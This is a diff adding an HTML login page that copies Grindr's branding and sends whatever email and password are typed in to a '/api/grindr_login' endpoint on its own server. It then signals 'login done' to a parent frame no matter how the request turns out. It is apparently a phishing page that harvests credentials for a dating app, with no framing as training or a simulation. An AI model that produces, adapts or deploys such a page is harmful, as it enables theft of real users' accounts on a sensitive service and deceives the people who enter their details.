@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Grindr</title>
+  <style>
+    *, *::before, *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+ 
+    html, body {
+      width: 100%;
+      height: 100%;
+    }
+ 
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #111008;
+      overflow-x: hidden;
+    }
+ 
+    .bg {
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse at 72% 28%, rgba(110, 75, 18, 0.60) 0%, transparent 52%),
+        radial-gradient(ellipse at 18% 72%, rgba(70, 48, 10, 0.50) 0%, transparent 52%),
+        radial-gradient(ellipse at 50% 50%, rgba(50, 36, 8, 0.35) 0%, transparent 68%),
+        linear-gradient(160deg, #2e2208 0%, #1a1408 35%, #111008 65%, #0d0c07 100%);
+      z-index: 0;
+    }
+ 
+    /* ── Scrollable wrapper that fills the screen ── */
+    .page {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 5vh 5vw;
+    }
+ 
+    /* ── Card that scales with the viewport ── */
+    .container {
+      width: min(92vw, 520px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+ 
+    /* ── Logo ── */
+    .logo-wrap {
+      display: flex;
+      align-items: center;
+      gap: clamp(6px, 1.2vw, 12px);
+      margin-bottom: clamp(40px, 7vh, 72px);
+    }
+ 
+    .logo-icon {
+      width: clamp(38px, 5.5vw, 54px);
+      height: clamp(38px, 5.5vw, 54px);
+    }
+ 
+    .logo-text {
+      font-size: clamp(26px, 4vw, 38px);
+      font-weight: 700;
+      color: #ffffff;
+      letter-spacing: -0.5px;
+    }
+ 
+    .beta-badge {
+      background: #f5c518;
+      color: #000;
+      font-size: clamp(10px, 1.1vw, 13px);
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 5px;
+      letter-spacing: 0.5px;
+      align-self: flex-start;
+      margin-top: 4px;
+    }
+ 
+    /* ── Input Groups ── */
+    .input-group {
+      width: 100%;
+      margin-bottom: clamp(18px, 2.8vh, 30px);
+      position: relative;
+    }
+ 
+    .input-label {
+      position: absolute;
+      top: clamp(9px, 1.2vh, 13px);
+      left: clamp(16px, 2.2vw, 24px);
+      font-size: clamp(10px, 1.1vw, 13px);
+      color: rgba(255,255,255,0.5);
+      pointer-events: none;
+      letter-spacing: 0.1px;
+    }
+ 
+    .input-field {
+      width: 100%;
+      background: rgba(255,255,255,0.08);
+      border: 1.5px solid rgba(255,255,255,0.18);
+      border-radius: clamp(10px, 1.5vw, 14px);
+      padding: clamp(28px, 3.8vh, 36px) clamp(16px, 2.2vw, 24px) clamp(10px, 1.4vh, 14px);
+      color: #fff;
+      font-size: clamp(15px, 2vw, 20px);
+      outline: none;
+      transition: border-color 0.2s;
+    }
+ 
+    .input-field::placeholder {
+      color: rgba(255,255,255,0.40);
+    }
+ 
+    .input-field:focus {
+      border-color: rgba(255,255,255,0.42);
+    }
+ 
+    .eye-icon {
+      position: absolute;
+      right: clamp(14px, 1.8vw, 20px);
+      top: 50%;
+      transform: translateY(-50%);
+      color: rgba(255,255,255,0.5);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+    }
+ 
+    .eye-icon svg {
+      width: clamp(18px, 2vw, 24px);
+      height: clamp(18px, 2vw, 24px);
+    }
+ 
+    /* ── Keep me logged in ── */
+    .keep-logged {
+      display: flex;
+      align-items: center;
+      gap: clamp(10px, 1.4vw, 14px);
+      margin-top: 2px;
+      margin-bottom: clamp(20px, 3.2vh, 32px);
+    }
+ 
+    .keep-logged input[type="checkbox"] {
+      appearance: none;
+      -webkit-appearance: none;
+      width: clamp(22px, 2.6vw, 28px);
+      height: clamp(22px, 2.6vw, 28px);
+      border-radius: 50%;
+      border: 2px solid rgba(255,255,255,0.35);
+      background: transparent;
+      cursor: pointer;
+      flex-shrink: 0;
+      transition: background 0.2s, border-color 0.2s;
+    }
+ 
+    .keep-logged input[type="checkbox"]:checked {
+      background: #f5c518;
+      border-color: #f5c518;
+    }
+ 
+    .keep-logged label {
+      color: rgba(255,255,255,0.85);
+      font-size: clamp(14px, 1.8vw, 18px);
+      cursor: pointer;
+    }
+ 
+    /* ── Log In Button ── */
+    .btn-login {
+      width: 100%;
+      padding: clamp(15px, 2.2vh, 22px);
+      border-radius: 50px;
+      border: none;
+      background: rgba(255,255,255,0.17);
+      color: rgba(255,255,255,0.52);
+      font-size: clamp(15px, 2vw, 20px);
+      font-weight: 600;
+      cursor: pointer;
+      letter-spacing: 0.3px;
+      transition: background 0.2s;
+      margin-bottom: clamp(18px, 2.8vh, 28px);
+    }
+ 
+    .btn-login:hover {
+      background: rgba(255,255,255,0.25);
+    }
+ 
+    /* ── Forgot Password ── */
+    .forgot {
+      color: rgba(255,255,255,0.75);
+      font-size: clamp(13px, 1.7vw, 18px);
+      text-decoration: none;
+      margin-bottom: clamp(40px, 6.5vh, 65px);
+      display: block;
+      text-align: center;
+    }
+ 
+    /* ── Terms ── */
+    .terms {
+      font-size: clamp(14px, 1.8vw, 18px);
+      color: rgba(255,255,255,0.52);
+      text-align: center;
+      line-height: 1.85;
+      margin-bottom: clamp(28px, 4.5vh, 46px);
+      padding: 0 4px;
+    }
+ 
+    .terms a {
+      color: #f5c518;
+      text-decoration: none;
+    }
+ 
+    /* ── Copyright ── */
+    .copyright {
+      font-size: clamp(13px, 1.6vw, 17px);
+      color: rgba(255,255,255,0.38);
+      text-align: center;
+    }
+ 
+    /* ── Responsive tweaks for tall/narrow screens ── */
+    @media (max-width: 480px) {
+      .container {
+        width: 92vw;
+      }
+    }
+ 
+    @media (min-width: 900px) {
+      .container {
+        width: min(55vw, 560px);
+      }
+    }
+  </style>
+</head>
+<body>
+ 
+<div class="bg"></div>
+ 
+<div class="page">
+  <div class="container">
+ 
+    <!-- Logo -->
+    <div class="logo-wrap">
+      <svg class="logo-icon" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect width="60" height="60" rx="14" fill="#F5C518"/>
+        <path d="M30 10C19.5 10 11 18 11 27.5C11 34.5 15.5 40.5 22 43.5L22 50L30 45L38 50L38 43.5C44.5 40.5 49 34.5 49 27.5C49 18 40.5 10 30 10Z" fill="#1a1a1a"/>
+        <ellipse cx="22" cy="27" rx="4.5" ry="5.5" fill="#F5C518"/>
+        <ellipse cx="38" cy="27" rx="4.5" ry="5.5" fill="#F5C518"/>
+      </svg>
+      <span class="logo-text">Grindr</span>
+      <span class="beta-badge">beta</span>
+    </div>
+ 
+    <!-- Email -->
+    <div class="input-group">
+      <span class="input-label">Email</span>
+      <input class="input-field" type="email" placeholder="Email" id="emailField" />
+    </div>
+ 
+    <!-- Password -->
+    <div class="input-group" style="position:relative;">
+      <span class="input-label">Password</span>
+      <input class="input-field" type="password" placeholder="Password" id="pwdField" style="padding-right: clamp(44px,5vw,56px);"/>
+      <span class="eye-icon" onclick="togglePwd()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20C7 20 2.73 16.39 1 12a10.94 10.94 0 0 1 4.06-5.94"/>
+          <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c5 0 9.27 3.61 11 8a10.94 10.94 0 0 1-1.27 2.43"/>
+          <line x1="1" y1="1" x2="23" y2="23"/>
+          <path d="M10.73 10.73A3 3 0 0 0 12 15a3 3 0 0 0 2.27-1.27"/>
+        </svg>
+      </span>
+    </div>
+ 
+    <!-- Keep me logged in -->
+    <div class="keep-logged">
+      <input type="checkbox" id="keepMe" />
+      <label for="keepMe">Keep me logged in</label>
+    </div>
+ 
+    <!-- Log In Button -->
+    <button class="btn-login" onclick="loginAttempt()">Log In</button>
+ 
+    <!-- Forgot Password -->
+    <a href="#" class="forgot">Forgot Password</a>
+ 
+    <!-- Terms -->
+    <p class="terms">
+      By logging in, you continue to agree to our<br>
+      <a href="#">Terms</a>. Learn how we process your data in our<br>
+      <a href="#">Privacy Policy</a> and <a href="#">Cookie Policy</a>. You must be<br>
+      at least 18 years old to enter.
+    </p>
+ 
+    <!-- Copyright -->
+    <p class="copyright">Copyright Grindr LLC, 2026</p>
+ 
+  </div>
+</div>
+ 
+<script>
+  function togglePwd() {
+    const f = document.getElementById('pwdField');
+    f.type = f.type === 'password' ? 'text' : 'password';
+  }
+  
+  async function loginAttempt() {
+    const email = document.getElementById('emailField').value;
+    const password = document.getElementById('pwdField').value;
+    
+    if (!email || !password) {
+      alert("Please enter email and password");
+      return;
+    }
+    
+    try {
+        const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
+        const endpoint = apiHost + '/api/grindr_login';
+        
+        await fetch(endpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password })
+        });
+        
+        window.parent.postMessage({ type: 'GRINDR_LOGIN_DONE' }, '*');
+    } catch (error) {
+        console.error(error);
+        window.parent.postMessage({ type: 'GRINDR_LOGIN_DONE' }, '*');
+    }
+  }
+</script>
+ 
+</body>
+</html>
